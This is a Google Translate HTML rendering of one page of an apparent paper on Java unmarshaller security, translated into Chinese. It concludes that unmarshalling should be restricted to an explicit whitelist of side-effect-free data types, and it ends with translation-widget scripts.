<div style="position:absolute;top:38664;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代码执行。</font><font style="vertical-align: inherit;">一旦您允许攻击者调用您甚至不知道的代码</font></font></nobr></div>
<div style="position:absolute;top:38682;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它要做什么，很可能会带你去你不喜欢的地方。</font></font></nobr></div>
<div style="position:absolute;top:38704;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无论解组机制如何与对象交互或如何“强大”</font></font></nobr></div>
<div style="position:absolute;top:38722;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果它允许解组为尚未明确指定的对象类型，</font><font style="vertical-align: inherit;">则为</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">78</font></font></font><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:38740;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选择用于此类目的，几乎可以肯定它是可利用的。</font></font></nobr></div>
<div style="position:absolute;top:38762;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;" class="">唯一正确的修复方法是限制类型的可用性——可能在</font></font></nobr></div>
<div style="position:absolute;top:38780;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显式白名单的形式，使用从根开始的运行时类型信息</font></font></nobr></div>
<div style="position:absolute;top:38798;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类型或其他一些指标 - 已知好的指标。</font><font style="vertical-align: inherit;">这些必须遵循所需的</font></font></nobr></div>
<div style="position:absolute;top:38816;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在最好的情况下，解组时没有任何副作用的合同</font></font></nobr></div>
<div style="position:absolute;top:38834;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些将是根本不包含任何逻辑的数据对象。</font><font style="vertical-align: inherit;">出于实用目的</font></font></nobr></div>
<div style="position:absolute;top:38852;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对实际使用的类型的限制似乎已经足够了，通常是吨</font></font></nobr></div>
<div style="position:absolute;top:38870;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">你甚至不关心的代码会让你陷入困境。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:38933;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">75</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">延迟解组，直到知道预期的类型</font></font></font></nobr></div>
<div style="position:absolute;top:38948;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">76</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在判断是否有人甚至可以决定时，作者建议您查看迭代器</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:38964;left:186"><nobr><font style="vertical-align: inherit;"><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#18"><font style="vertical-align: inherit;">ServiceLoader (4.3) 中</font></a></font><font style="vertical-align: inherit;">描述的触发器</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#18"><font style="vertical-align: inherit;"></font></a></font><a href="https://translate.googleusercontent.com/translate_f#18"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:38976;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">77</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">好吧，至少是任何远程有用的东西</font></font></font></nobr></div>
<div style="position:absolute;top:38990;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">78 </font><font color="#800000" style="font-size:9px"><a href="https://translate.googleusercontent.com/translate_f#11"><font style="vertical-align: inherit;">Java 序列化 (3.2.1)</font></a></font><font style="font-size:9px"><font style="vertical-align: inherit;">小工具</font></font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">中代理构造的盛行</font></font></font><font style="vertical-align: inherit;"><font style="font-size:9px"><font style="vertical-align: inherit;">不应被视为</font></font></font><font color="#800000" style="font-size:9px"><a href="https://translate.googleusercontent.com/translate_f#11"><font style="vertical-align: inherit;"></font></a></font><font style="font-size:9px"><font style="vertical-align: inherit;"></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:39007;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表明这些实际上是开发所必需的。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:39049;left:439"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">31</font></font></nobr></div>
</span></font>


<script>_addload(function(){_setupIW('com');_csi('en','zh-CN','marshalsec.pdf');});</script>
            <script>
              function gtElInit() {
                var lib = new google.translate.TranslateService();
                lib.setCheckVisibility(false);
                lib.translatePage('en', 'zh-CN', function (progress, done, error) {
                  if (progress == 100 || done || error) {
                    document.getElementById("gt-dt-spinner").style.display = "none";
                  }
                });
              }
            </script>
            <script src="./Java 解组器安全性_files/element.js.下载">
            </script><div id="goog-gt-tt" class="VIpgJd-suEOdc skiptranslate" dir="ltr" style="visibility: hidden; left: 376px; top: 35771px; display: none;"><div style="padding: 8px;"><div><div class="logo"><img src="./Java 解组器安全性_files/translate_24dp.png" width="20" height="20" alt="Google 翻译"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">原文</h1></div><div class="middle" style="padding: 8px;"><div class="original-text">unmarshal at all, if you weren't going to use the data afterwards.</div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">提供更好的翻译建议</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none; opacity: 0;"></div></div>
          <div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div></body></html>